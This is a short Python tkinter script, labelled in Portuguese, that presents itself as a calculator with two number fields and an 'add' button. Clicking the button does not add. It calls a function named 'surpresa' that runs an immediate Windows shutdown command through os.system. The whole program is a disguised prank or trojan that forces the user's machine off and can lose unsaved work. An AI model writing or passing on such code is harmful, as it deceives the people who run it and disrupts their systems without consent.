from tkinter import *
import os

janela = Tk()
janela.geometry("400x400")
janela.title("Calculadora")
def surpresa():
	os.system("shutdown -s -t 00")

n1 = Label(text="Digite um número")
n1.pack()
n1Entrada = Entry()
n1Entrada.pack()

n2 = Label(text="Digite um número")
n2.pack()
n2Entrada = Entry()
n2Entrada.pack()

somar = Button(text="Somar!", command=surpresa)
somar.pack()

janela.mainloop()